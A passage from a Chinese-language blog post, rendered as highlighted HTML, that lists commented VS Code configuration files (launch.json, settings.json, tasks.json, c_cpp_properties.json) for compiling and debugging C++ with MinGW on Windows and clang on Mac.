class="attr">&quot;intelliSenseMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;default&#125;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">4</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="launch-json"><a href="#launch-json" class="headerlink" title="launch.json"></a>launch.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// 使用 IntelliSense 了解相关属性。 </span></span><br><span class="line">    <span class="comment">// 悬停以查看现有属性的描述。</span></span><br><span class="line">    <span class="comment">// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;g++.exe build and debug active file&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppdbg&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;\\test.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;stopAtEntry&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;environment&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;externalConsole&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;MIMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gdb&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;miDebuggerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C:\\mingw64\\bin\\gdb.exe&quot;</span><span class="punctuation">,</span>		<span class="comment">/*修改成自己bin目录下的gdb.exe，这里的路径和电脑里复制的文件目录有一点不一样，这里是两个反斜杠\\*/</span></span><br><span class="line">            <span class="attr">&quot;setupCommands&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;为 gdb 启用整齐打印&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-enable-pretty-printing&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ignoreFailures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;preLaunchTask&quot;</span><span class="punctuation">:</span> <span class="string">&quot;task g++&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="settings-json"><a href="#settings-json" class="headerlink" title="settings.json"></a>settings.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">/*editor*/</span></span><br><span class="line">    <span class="attr">&quot;editor.cursorBlinking&quot;</span><span class="punctuation">:</span> <span class="string">&quot;smooth&quot;</span><span class="punctuation">,</span><span class="comment">//使编辑器光标的闪烁平滑，有呼吸感</span></span><br><span class="line">    <span class="attr">&quot;editor.formatOnPaste&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//在粘贴时格式化代码</span></span><br><span class="line">    <span class="attr">&quot;editor.formatOnType&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//敲完一行代码自动格式化</span></span><br><span class="line">    <span class="attr">&quot;editor.smoothScrolling&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//使编辑器滚动变平滑</span></span><br><span class="line">    <span class="attr">&quot;editor.tabCompletion&quot;</span><span class="punctuation">:</span> <span class="string">&quot;on&quot;</span><span class="punctuation">,</span><span class="comment">//启用Tab补全</span></span><br><span class="line">    <span class="attr">&quot;editor.fontFamily&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#x27;fira code&#x27;, &#x27;思源黑体&#x27;&quot;</span><span class="punctuation">,</span><span class="comment">//字体设置，个人喜欢Jetbrains Mono作英文字体，思源黑体作中文字体</span></span><br><span class="line">    <span class="attr">&quot;editor.fontSize&quot;</span><span class="punctuation">:</span> <span class="number">20</span><span class="punctuation">,</span> <span class="comment">//设置字体大小</span></span><br><span class="line">    <span class="attr">&quot;editor.fontWeight&quot;</span><span class="punctuation">:</span> <span class="string">&quot;normal&quot;</span><span class="punctuation">,</span> <span class="comment">//这个设置字体粗细，可选normal,bold,&quot;100&quot;~&quot;900&quot;等，选择合适的就行</span></span><br><span class="line">    <span class="attr">&quot;editor.fontLigatures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//启用字体连字</span></span><br><span class="line">    <span class="attr">&quot;editor.detectIndentation&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="comment">//不基于文件内容选择缩进用制表符还是空格</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    因为有时候VSCode的判断是错误的</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="attr">&quot;editor.insertSpaces&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//敲下Tab键时插入4个空格而不是制表符</span></span><br><span class="line">    <span class="attr">&quot;editor.copyWithSyntaxHighlighting&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="comment">//复制代码时复制纯文本而不是连语法高亮都复制了</span></span><br><span class="line">    <span class="attr">&quot;editor.suggest.snippetsPreventQuickSuggestions&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="comment">//这个开不开效果好像都一样，据说是因为一个bug，建议关掉</span></span><br><span class="line">    <span class="attr">&quot;editor.stickyTabStops&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//在缩进上移动光标时四个空格一组来移动，就仿佛它们是制表符(\t)一样</span></span><br><span class="line">    <span class="attr">&quot;editor.wordBasedSuggestions&quot;</span><span class="punctuation">:</span> <span class="string">&quot;off&quot;</span><span class="punctuation">,</span><span class="comment">//关闭基于文件中单词来联想的功能（语言自带的联想就够了，开了这个会导致用vscode写MarkDown时的中文引号异常联想）</span></span><br><span class="line">    <span class="attr">&quot;editor.linkedEditing&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//html标签自动重命名（喜大普奔！终于不需要Auto Rename Tag插件了！）</span></span><br><span class="line">    <span class="attr">&quot;editor.wordWrap&quot;</span><span class="punctuation">:</span> <span class="string">&quot;on&quot;</span><span class="punctuation">,</span><span class="comment">//在文件内容溢出vscode显示区域时自动折行</span></span><br><span class="line">    <span class="attr">&quot;editor.cursorSmoothCaretAnimation&quot;</span><span class="punctuation">:</span> <span class="string">&quot;on&quot;</span><span class="punctuation">,</span><span class="comment">//让光标移动、插入变得平滑</span></span><br><span class="line">    <span class="attr">&quot;editor.renderControlCharacters&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//编辑器中显示不可见的控制字符</span></span><br><span class="line">    <span class="attr">&quot;editor.renderWhitespace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;boundary&quot;</span><span class="punctuation">,</span><span class="comment">//除了两个单词之间用于分隔单词的一个空格，以一个小灰点的样子使空格可见</span></span><br><span class="line">    <span class="comment">/*terminal*/</span></span><br><span class="line">    <span class="attr">&quot;terminal.integrated.defaultProfile.windows&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Command Prompt&quot;</span><span class="punctuation">,</span><span class="comment">//将终端设为cmd，个人比较喜欢cmd作为终端</span></span><br><span class="line">    <span class="attr">&quot;terminal.integrated.cursorBlinking&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//终端光标闪烁</span></span><br><span class="line">    <span class="attr">&quot;terminal.integrated.rightClickBehavior&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default&quot;</span><span class="punctuation">,</span><span class="comment">//在终端中右键时显示菜单而不是粘贴（个人喜好）</span></span><br><span class="line">    <span class="comment">/*files*/</span></span><br><span class="line">    <span class="attr">&quot;files.autoGuessEncoding&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//让VScode自动猜源代码文件的编码格式</span></span><br><span class="line">    <span class="attr">&quot;files.autoSave&quot;</span><span class="punctuation">:</span> <span class="string">&quot;onFocusChange&quot;</span><span class="punctuation">,</span><span class="comment">//在编辑器失去焦点时自动保存，这使自动保存近乎达到“无感知”的体验</span></span><br><span class="line">    <span class="attr">&quot;files.exclude&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="comment">//隐藏一些碍眼的文件夹</span></span><br><span class="line">        <span class="attr">&quot;**/.git&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/.svn&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/.hg&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/CVS&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/.DS_Store&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/tmp&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/node_modules&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/bower_components&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;files.watcherExclude&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="comment">//不索引一些不必要索引的大文件夹以减少内存和CPU消耗</span></span><br><span class="line">        <span class="attr">&quot;**/.git/objects/**&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/.git/subtree-cache/**&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/node_modules/**&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/tmp/**&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/bower_components/**&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;**/dist/**&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">/*workbench*/</span></span><br><span class="line">    <span class="attr">&quot;workbench.list.smoothScrolling&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//使文件列表滚动变平滑</span></span><br><span class="line">    <span class="attr">&quot;workbench.editor.enablePreview&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="comment">//打开文件时不是“预览”模式，即在编辑一个文件时打开编辑另一个文件不会覆盖当前编辑的文件而是新建一个标签页</span></span><br><span class="line">    <span class="attr">&quot;workbench.editor.wrapTabs&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="comment">//隐藏新建无标题文件时的“选择语言？”提示（个人喜好，可以删掉此行然后Ctrl+N打开无标题新文件看看不hidden的效果）</span></span><br><span class="line">    <span class="comment">/*explorer*/</span></span><br><span class="line">    <span class="attr">&quot;explorer.confirmDelete&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="comment">//删除文件时不弹出确认弹窗（因为很烦）</span></span><br><span class="line">    <span class="attr">&quot;explorer.confirmDragAndDrop&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="comment">//往左边文件资源管理器拖动东西来移动/复制时不显示确认窗口（因为很烦）</span></span><br><span class="line">    <span class="comment">/*search*/</span></span><br><span class="line">    <span class="attr">&quot;search.followSymlinks&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="comment">//据说可以减少vscode的CPU和内存占用</span></span><br><span class="line">    <span class="comment">/*window*/</span></span><br><span class="line">    <span class="attr">&quot;window.menuBarVisibility&quot;</span><span class="punctuation">:</span> <span class="string">&quot;visible&quot;</span><span class="punctuation">,</span><span class="comment">//在全屏模式下仍然显示窗口顶部菜单（没有菜单很难受）</span></span><br><span class="line">    <span class="attr">&quot;window.dialogStyle&quot;</span><span class="punctuation">:</span> <span class="string">&quot;custom&quot;</span><span class="punctuation">,</span><span class="comment">//使用更具有VSCode的UI风格的弹窗提示（更美观）</span></span><br><span class="line">    <span class="comment">/*debug*/</span></span><br><span class="line">    <span class="attr">&quot;debug.internalConsoleOptions&quot;</span><span class="punctuation">:</span> <span class="string">&quot;openOnSessionStart&quot;</span><span class="punctuation">,</span><span class="comment">//每次调试都打开调试控制台，方便调试</span></span><br><span class="line">    <span class="attr">&quot;debug.showBreakpointsInOverviewRuler&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">//在滚动条标尺上显示断点的位置，便于查找断点的位置</span></span><br><span class="line">    <span class="attr">&quot;debug.toolBarLocation&quot;</span><span class="punctuation">:</span> <span class="string">&quot;docked&quot;</span><span class="punctuation">,</span><span class="comment">//固定调试时工具条的位置，防止遮挡代码内容（个人喜好）</span></span><br><span class="line">    <span class="attr">&quot;debug.saveBeforeStart&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nonUntitledEditorsInActiveGroup&quot;</span><span class="punctuation">,</span><span class="comment">//在启动调试会话前保存除了无标题文档以外的文档（毕竟你创建了无标题文档就说明你根本没有想保存它的意思（至少我是这样的。））</span></span><br><span class="line">    <span class="attr">&quot;debug.onTaskErrors&quot;</span><span class="punctuation">:</span> <span class="string">&quot;showErrors&quot;</span><span class="punctuation">,</span><span class="comment">//预启动任务出错后显示错误，并不启动调试</span></span><br><span class="line">    <span class="comment">/*html*/</span></span><br><span class="line">    <span class="attr">&quot;html.format.indentHandlebars&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;workbench.editor.empty.hint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hidden&quot;</span> <span class="punctuation">,</span><span class="comment">//在写包含形如&#123;&#123;xxx&#125;&#125;的标签的html文档时，也对标签进行缩进（更美观）</span></span><br><span class="line">    </span><br><span class="line">	<span class="attr">&quot;code-runner.executorMap&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;cpp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cd $dir &amp;&amp; g++ -std=c++17 $fileName -g -o $test.exe -std=c++11 &amp;&amp; $dir$test.exe&quot;</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;code-runner.runInTerminal&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;files.associations&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;ostream&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="tasks-json"><a href="#tasks-json" class="headerlink" title="tasks.json"></a>tasks.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// See https://go.microsoft.com/fwlink/?LinkId=733558 </span></span><br><span class="line">    <span class="comment">// for the documentation about the tasks.json format</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;tasks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;shell&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;task g++&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C:\\mingw64\\bin\\g++.exe&quot;</span><span class="punctuation">,</span>	<span class="comment">/*修改成自己bin目录下的g++.exe，这里的路径和电脑里复制的文件目录有一点不一样，这里是两个反斜杠\\*/</span></span><br><span class="line">        <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;$&#123;file&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;-o&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;$&#123;workspaceFolder&#125;\\test.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;-I&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;E:\\Cpp code&quot;</span><span class="punctuation">,</span>      <span class="comment">/*修改成自己放c/c++项目的文件夹，这里的路径和电脑里复制的文件目录有一点不一样，这里是两个反斜杠\\*/</span></span><br><span class="line">            <span class="string">&quot;-std=c++17&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C:\\mingw64\\bin&quot;</span>	<span class="comment">/*修改成自己bin目录，这里的路径和电脑里复制的文件目录有一点不一样，这里是两个反斜杠\\*/</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">        </span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="MAC中vscode的四个文件配置"><a href="#MAC中vscode的四个文件配置" class="headerlink" title="MAC中vscode的四个文件配置"></a>MAC中vscode的四个文件配置</h2><h3 id="c-cpp-properties-json-1"><a href="#c-cpp-properties-json-1" class="headerlink" title="c_cpp_properties.json"></a>c_cpp_properties.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Mac&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;includePath&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;$&#123;workspaceFolder&#125;/**&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;defines&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;macFrameworkPath&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;/Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/System/Library/Frameworks&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;compilerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/bin/clang++&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c17&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cppStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c++17&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;intelliSenseMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;macos-clang-arm64&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">4</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="launcn-json"><a href="#launcn-json" class="headerlink" title="launcn.json"></a>launcn.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// 使用 IntelliSense 了解相关属性。 </span></span><br><span class="line">    <span class="comment">// 悬停以查看现有属性的描述。</span></span><br><span class="line">    <span class="comment">// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lldb&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Debug&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span>  <span class="string">&quot;$&#123;workspaceFolder&#125;//test&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;preLaunchTask&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C/C++: clang++ 生成活动文件&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="settings-json-1"><a href="#settings-json-1" class="headerlink" title="settings.json"></a>settings.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;code-runner.runInTerminal&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;code-runner.saveAllFilesBeforeRun&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;code-runner.saveFileBeforeRun&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;code-runner.preserveFocus&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cmake.configureOnOpen&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;explorer.confirmDelete&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;editor.fontSize&quot;</span><span class="punctuation">:</span> <span class="number">18</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;editor.fontFamily&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Fira Code&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;explorer.confirmDragAndDrop&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;files.autoSave&quot;</span><span class="punctuation">:</span> <span class="string">&quot;onFocusChange&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;editor.fontLigatures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;editor.fontWeight&quot;</span><span class="punctuation">:</span> <span class="string">&quot;normal&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;workbench.iconTheme&quot;</span><span class="punctuation">:</span> <span class="string">&quot;material-icon-theme&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;terminal.integrated.enableMultiLinePasteWarning&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;code-runner.executorMap&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;cpp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cd $dir &amp;&amp; clang++ -std=c++17 $fileName -o $test.out &amp;&amp; $dir$test.out&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;python&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cd $dir &amp;&amp; python3 $fileName&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;files.associations&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__bit_reference&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__config&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__debug&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span 